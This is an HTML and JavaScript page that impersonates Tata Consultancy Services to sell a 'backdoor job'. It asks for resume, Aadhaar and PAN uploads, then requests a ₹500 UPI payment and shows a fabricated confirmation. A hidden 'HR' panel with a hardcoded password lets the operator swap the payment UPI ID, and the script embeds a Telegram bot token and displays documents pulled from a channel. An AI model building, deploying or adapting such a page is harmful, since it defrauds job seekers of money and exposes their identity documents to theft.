<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TCS Backdoor Job Apply</title>
<style>
  /* ... (আগের মতো CSS থাকবে) ... */
  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
  body {
    font-family: 'Roboto', sans-serif;
    background-color: #f6f8fa;
    color: #23375b;
    margin: 0; padding: 0 15px 40px;
  }
  header {
    display:flex; align-items:center; justify-content:center; gap:15px;
    background: linear-gradient(90deg, #0c234b 0%, #46b2e0 100%);
    padding: 30px 20px;
    box-shadow: 0 4px 10px rgba(12,35,75,0.3);
  }
  header img {
    height: 50px;
  }
  header div {
    color:#fff; text-align:center;
  }
  header h1 {
    margin:0;
    font-weight:900;
    font-size:2.8em;
    letter-spacing:3px;
  }
  header p {
    margin-top:8px;
    font-weight:600;
    font-size:1.3em;
    letter-spacing:1px;
    text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
  }
  section {
    max-width: 720px;
    margin: 40px auto;
    background: white;
    border-radius: 10px;
    padding: 30px 35px;
    box-shadow: 0 8px 25px rgba(12,35,75,0.12);
  }
  h2 {
    color: #114b8b;
    border-left: 5px solid #014f86;
    padding-left: 12px;
    margin-bottom: 25px;
    font-weight: 700;
  }
  label {
    display: block;
    margin-bottom: 10px;
    font-weight: 600;
    color: #222f4f;
  }
  input[type="text"], input[type="file"], input[type="number"], input[type="password"], select {
    width: 100%;
    padding: 12px;
    border-radius: 6px;
    border: 1.8px solid #c1d4e6;
    font-size: 1em;
    transition: border-color 0.3s ease;
  }
  input[type="text"]:focus, input[type="file"]:focus, input[type="number"]:focus, input[type="password"]:focus, select:focus {
    border-color: #0c234b;
    outline: none;
    box-shadow: 0 0 5px #0c234b;
  }
  button {
    background-color: #0c234b;
    color: white;
    border: none;
    padding: 14px 0;
    width: 100%;
    border-radius: 8px;
    font-weight: 700;
    font-size: 1.1em;
    letter-spacing: 1.2px;
    margin-top: 25px;
    cursor: pointer;
    box-shadow: 0 5px 15px rgba(12,35,75,0.4);
    transition: background-color 0.3s ease, box-shadow 0.3s ease;
  }
  button:hover {
    background-color: #014f86;
    box-shadow: 0 7px 21px rgba(1,79,134,0.6);
  }
  #telegram-images img {
    width: 120px;
    height: 120px;
    object-fit: cover;
    border-radius: 8px;
    box-shadow: 0 3px 10px rgba(0,0,0,0.15);
    margin: 10px;
    cursor: zoom-in;
    transition: transform 0.3s ease;
  }
  #telegram-images img:hover {
    transform: scale(1.1);
  }
  #fullscreenOverlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.9);
    justify-content: center;
    align-items: center;
    z-index: 9999;
  }
  #fullscreenOverlay img {
    max-width: 90%;
    max-height: 90%;
    border-radius: 8px;
    cursor: zoom-out;
    box-shadow: 0 0 30px rgba(255,255,255,0.8);
  }
  footer {
    text-align: center;
    padding: 25px 10px;
    font-weight: 600;
    color: #0c234b;
    letter-spacing: 0.04em;
  }
</style>
</head>
<body>

<header>
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Tata_Consultancy_Services_Logo.svg/2560px-Tata_Consultancy_Services_Logo.svg.png" alt="TCS Logo" />
  <div>
    <h1>Tata Consultancy Services</h1>
    <p>Backdoor job full save and secure - Apply with confidence</p>
  </div>
</header>

<section id="apply-section">
  <h2>Apply for Backdoor Job</h2>
  <label>Upload Resume (PDF)
    <input type="file" id="resume" accept=".pdf" />
  </label>
  <label>Upload Aadhaar Card (Image/PDF)
    <input type="file" id="aadhaar" accept="image/*,.pdf" />
  </label>
  <label>Upload PAN Card (Image/PDF)
    <input type="file" id="pancard" accept="image/*,.pdf" />
  </label>
  <label>Upload Coding Certificate (Optional)
    <input type="file" id="certificate" accept="image/*,.pdf" />
  </label>
  <label for="job-location">Select Job Location:</label>
  <select id="job-location">
    <option value="">--Select Location--</option>
    <option value="Hyderabad">Hyderabad</option>
    <option value="Bangalore">Bangalore</option>
    <option value="Chennai">Chennai</option>
    <option value="Pune">Pune</option>
    <option value="Noida">Noida</option>
    <option value="Gujarat">Gujarat</option>
  </select>
  <button id="applyBtn">Apply for Job</button>
</section>

<section id="payment-section" style="display:none;">
  <h2>Complete Payment</h2>
  <p>Amount to pay: ₹ <span id="paymentAmount">500</span></p>
  <label>UPI ID:
    <input type="text" id="upi-id" readonly />
  </label>
  <div id="qrCode"></div>
  <button id="paymentDoneBtn">Payment Completed</button>
</section>

<section id="success-section" style="display:none;">
  <h2>Apply Successful!</h2>
  <p>Your Application ID: <span id="applicationId"></span></p>
  <p>Selected Job Location: <span id="selectedLocation"></span></p>
  <p>Interview Date: Next month 27</p>
  <p>Interview Time: 28th Morning 10 AM</p>
</section>

<section id="telegram-images-section" style="margin-top:40px;">
  <h2>Uploaded Documents Preview (Telegram Storage)</h2>
  <div id="telegram-images"><p>🔄 Loading documents from Telegram Storage...</p></div>
</section>

<section id="hr-login-section" style="margin-top: 40px;">
  <h2>HR Login (For UPI ID Change & Proxy Settings)</h2>
  <label>Enter HR Password:
    <input type="password" id="hrPassword" />
  </label>
  <button id="hrLoginBtn">Login</button>
</section>

<section id="hr-panel" style="display:none; margin-top: 20px;">
  <h3>Change UPI ID, Payment Amount, HR Password & MTProto Proxy Settings</h3>
  <label>UPI ID:
    <input type="text" id="newUpiId" />
  </label>
  <label>Payment Amount (₹):
    <input type="number" id="newAmount" min="1" />
  </label>
  <label>New HR Password:
    <input type="password" id="newHrPassword" />
  </label>
  <label>MTProto Proxy Host:
    <input type="text" id="proxyHost" placeholder="e.g. 14.102.10.38" />
  </label>
  <label>MTProto Proxy Port:
    <input type="number" id="proxyPort" min="1" max="65535" placeholder="e.g. 888" />
  </label>
  <label>MTProto Proxy Secret:
    <input type="text" id="proxySecret" placeholder="your-secret-here" />
  </label>
  <button id="saveSettingsBtn">Save</button>
</section>

<div id="fullscreenOverlay">
  <img src="" alt="Full screen preview" id="fullscreenImage" />
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<script>
  let upiId = "your-upi@bank";
  let paymentAmount = 500;
  let HR_PASSWORD = "Sourav@1234";

  let proxyHost = "14.102.10.38";
  let proxyPort = 888;
  let proxySecret = "eeNEgYdJvXrFGRMCIMJdCQ";

  const telegramBotToken = "5729834421:AAGrCVQPlxmxrqCT_g0mzWny-EdWU1febhE";
  const telegramChannelId = -1003102946985;
  const apiBase = `https://api.telegram.org/bot${telegramBotToken}`;

  const paymentSection = document.getElementById("payment-section");
  const applySection = document.getElementById("apply-section");
  const successSection = document.getElementById("success-section");
  const telegramImagesContainer = document.getElementById("telegram-images");
  const applicationIdSpan = document.getElementById("applicationId");
  const paymentAmountSpan = document.getElementById("paymentAmount");
  const upiInput = document.getElementById("upi-id");
  const qrCodeDiv = document.getElementById("qrCode");
  const selectedLocationSpan = document.getElementById("selectedLocation");

  const hrLoginSection = document.getElementById("hr-login-section");
  const hrPanel = document.getElementById("hr-panel");
  const hrPasswordInput = document.getElementById("hrPassword");
  const hrLoginBtn = document.getElementById("hrLoginBtn");
  const newUpiIdInput = document.getElementById("newUpiId");
  const newAmountInput = document.getElementById("newAmount");
  const newHrPasswordInput = document.getElementById("newHrPassword");
  const proxyHostInput = document.getElementById("proxyHost");
  const proxyPortInput = document.getElementById("proxyPort");
  const proxySecretInput = document.getElementById("proxySecret");
  const saveSettingsBtn = document.getElementById("saveSettingsBtn");

  let lastUpdateId = 0;
  let loadedFileIds = new Set();

  function showPaymentSection(){
    applySection.style.display = "none";
    paymentSection.style.display = "block";
    successSection.style.display = "none";

    paymentAmountSpan.textContent = paymentAmount;
    upiInput.value = upiId;

    const upiString = `upi://pay?pa=${encodeURIComponent(upiId)}&am=${paymentAmount}&cu=INR&tn=TCS Job Application Payment`;

    qrCodeDiv.innerHTML = '';
    new QRCode(qrCodeDiv, {
      text: upiString,
      width: 200,
      height: 200
    });
  }

  document.getElementById("applyBtn").onclick = () => {
    const resume = document.getElementById("resume").files[0];
    const aadhaar = document.getElementById("aadhaar").files[0];
    const pan = document.getElementById("pancard").files[0];
    const jobLocation = document.getElementById("job-location").value;

    if(!resume || !aadhaar || !pan){
      alert("Please upload Resume, Aadhaar, and PAN Card.");
      return;
    }
    if(!jobLocation){
      alert("Please select a Job Location.");
      return;
    }

    selectedLocationSpan.textContent = jobLocation;

    showPaymentSection();
  };

  document.getElementById("paymentDoneBtn").onclick = () => {
    paymentSection.style.display = "none";
    successSection.style.display = "block";

    const appId = "TCS" + Math.floor(100000 + Math.random() * 900000);
    applicationIdSpan.textContent = appId;
  };

  hrLoginBtn.onclick = () => {
    if(hrPasswordInput.value === HR_PASSWORD){
      alert("HR logged in");
      hrLoginSection.style.display = "none";
      hrPanel.style.display = "block";
      newUpiIdInput.value = upiId;
      newAmountInput.value = paymentAmount;
      newHrPasswordInput.value = "";
      proxyHostInput.value = proxyHost;
      proxyPortInput.value = proxyPort;
      proxySecretInput.value = proxySecret;
    }else{
      alert("Incorrect HR password");
    }
  };

  saveSettingsBtn.onclick = () => {
    const newUpi = newUpiIdInput.value.trim();
    const newAmt = Number(newAmountInput.value);
    const newHrPwd = newHrPasswordInput.value.trim();

    const newProxyHost = proxyHostInput.value.trim();
    const newProxyPort = Number(proxyPortInput.value);
    const newProxySecret = proxySecretInput.value.trim();

    if(newUpi === "" || newAmt <= 0){
      alert("Please enter valid UPI ID and amount");
      return;
    }
    if(newProxyHost === "" || isNaN(newProxyPort) || newProxyPort < 1 || newProxyPort > 65535 || newProxySecret === ""){
      alert("Please enter valid MTProto Proxy details");
      return;
    }

    upiId = newUpi;
    paymentAmount = newAmt;

    proxyHost = newProxyHost;
    proxyPort = newProxyPort;
    proxySecret = newProxySecret;

    if(newHrPwd){
      HR_PASSWORD = newHrPwd;
      alert("Settings saved. New UPI ID, amount, HR password, and proxy settings will be used.");
    } else {
      alert("Settings saved. New UPI ID, amount, and proxy settings will be used.");
    }

    newHrPasswordInput.value = "";

    if(paymentSection.style.display === "block"){
      showPaymentSection();
    }
    hrPanel.style.display = "none";
    hrLoginSection.style.display = "block";

    // এখানে আপনি চাইলে MTProto proxy সার্ভার আপডেট বা রিস্টার্ট করার ফাংশন কল করতে পারেন
    // উদাহরণ: updateProxyServer(proxyHost, proxyPort, proxySecret);
  };

  async function fetchTelegramStorageImages(){
    telegramImagesContainer.innerHTML = '<p>🔄 Loading documents from Telegram Storage...</p>';
    try{
      const response = await fetch(`${apiBase}/getUpdates?offset=${lastUpdateId + 1}`);
      const data = await response.json();
      console.log("Telegram getUpdates response:", data);

      if(!data.ok){
        telegramImagesContainer.innerHTML = '<p>⚠️ Failed to load documents.</p>';
        return;
      }
      const updates = data.result;
      for(const update of updates){
        if(update.update_id > lastUpdateId) lastUpdateId = update.update_id;

        const msg = update.message || update.channel_post;
        if(!msg) continue;

        if(msg.chat && msg.chat.id === telegramChannelId){
          console.log("Found message in channel:", msg);

          if(msg.document){
            console.log("Document found:", msg.document);
            loadedFileIds.add(msg.document.file_id);
          }

          if(msg.photo && msg.photo.length > 0){
            const largestPhoto = msg.photo[msg.photo.length - 1];
            console.log("Photo found:", largestPhoto);
            loadedFileIds.add(largestPhoto.file_id);
          }
        }
      }

      if(loadedFileIds.size === 0){
        telegramImagesContainer.innerHTML = '<p>No uploaded documents found yet.</p>';
        return;
      }

      telegramImagesContainer.innerHTML = '';
      for(const fileId of loadedFileIds){
        const fileResponse = await fetch(`${apiBase}/getFile?file_id=${fileId}`);
        const fileData = await fileResponse.json();
        console.log("File info for fileId", fileId, ":", fileData);

        if(fileData.ok && fileData.result && fileData.result.file_path){
          const url = `https://api.telegram.org/file/bot${telegramBotToken}/${fileData.result.file_path}`;
          const ext = fileData.result.file_path.split('.').pop().toLowerCase();
          if(['jpg','jpeg','png','gif','bmp','webp'].includes(ext)){
            const img = document.createElement('img');
            img.src = url;
            img.alt = 'Document Image';
            img.onclick = () => showFullScreen(url);
            telegramImagesContainer.appendChild(img);
          } else {
            const a = document.createElement('a');
            a.href = url;
            a.target = '_blank';
            a.textContent = `View Document (${fileData.result.file_path.split('/').pop()})`;
            a.style.display = 'block';
            a.style.marginBottom = '10px';
            telegramImagesContainer.appendChild(a);
          }
        }
      }
    }catch(e){
      console.error("Error loading Telegram documents:", e);
      telegramImagesContainer.innerHTML = '<p>❌ Error loading documents.</p>';
    }
  }

  const fullscreenOverlay = document.getElementById('fullscreenOverlay');
  const fullscreenImage = document.getElementById('fullscreenImage');
  function showFullScreen(src){
    fullscreenImage.src = src;
    fullscreenOverlay.style.display = 'flex';
  }
  fullscreenOverlay.addEventListener('click', () => {
    fullscreenOverlay.style.display = 'none';
    fullscreenImage.src = '';
  });

  fetchTelegramStorageImages();
</script>

<footer>
  <p>© 2025 Tata Consultancy Services | All rights reserved</p>
</footer>

</body>
</html>

